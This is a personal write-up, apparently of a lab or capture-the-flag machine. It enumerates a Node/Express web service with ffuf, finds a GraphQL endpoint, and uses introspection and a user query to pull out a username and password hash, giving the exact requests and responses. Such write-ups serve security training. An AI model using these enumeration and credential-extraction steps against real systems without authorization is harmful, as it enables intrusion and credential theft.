## MAIN

This application seems to be a simple web service. Upon entering we are greeted with the following response:

```http 
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 81
ETag: W/"51-gr8XZ5dnsfHNaB2KgX/Gxm9yVZU"
Date: Sat, 23 Nov 2024 20:45:12 GMT
Connection: close

{"message":"Hi Shiv, To get access please find the credentials with given query"}
```

From this we deduce the following information:

- There is a user name Shiv
- There are some credentials stored in this service
- There is a query system to access them

So our objective would be to find the place and how these queries are given.
## FIRST STEPS 

My first intuition was to fuzz the web application with the following tools and configurations:

**GET, ffuf, query on get parameter**

```bash
──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.121:3000/FUZZ -mc all > dump

:: Progress: [220559/220559] :: Job [1/1] :: 313 req/sec :: Duration: [0:11:21] :: Errors: 0 ::

# after some attempts more targeted to web services

┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -u http://10.10.10.121:3000/FUZZ -mc all > dump

┌──(kali㉿kali)-[~]
└─$ cat dump | grep -E "Status: [0-4]00"
graphql                 [Status: 400, Size: 18, Words: 3, Lines: 1, Duration: 506ms]
graphql/schema.json     [Status: 400, Size: 18, Words: 3, Lines: 1, Duration: 786ms]
graphql/schema.yaml     [Status: 400, Size: 18, Words: 3, Lines: 1, Duration: 786ms]
graphql/schema.xml      [Status: 400, Size: 18, Words: 3, Lines: 1, Duration: 1524ms]
graphql/console         [Status: 400, Size: 18, Words: 3, Lines: 1, Duration: 3416ms]

```

Seems that we can probably query graphql endpoints, after a little bit of testing i got the following: 

```http
GET /graphql/console?query=query%20epic%20%7b%20__schema%20%7b%20types%20%7bname%20fields%20%7bname%7d%7d%20%7d%7d HTTP/1.1
Host: 10.10.10.121:3000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36

Accept-Language: en-US,en;q=0.9
Connection: close

{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"user"}]},{"name":"User","fields":[{"name":"username"},{"name":"password"}]}, ... lots of data... }
```

So if we ask nicely we get:

```http 
GET /graphql/console?query=query%20epic%20%7b%20user%20%7busername%20password%7d%20%7d HTTP/1.1
Host: 10.10.10.121:3000

Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json
Content-Length: 96

Connection: close

{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```

Now we have a user and a password to log in. If i recall there was a login in the [[support webpage]].

## OTHER NOTES

- There appears to be no difference in the endpoints of the graphql (all point to the same service)
- There are only queries on this system, no mutations or other things, and the only query is for the users.
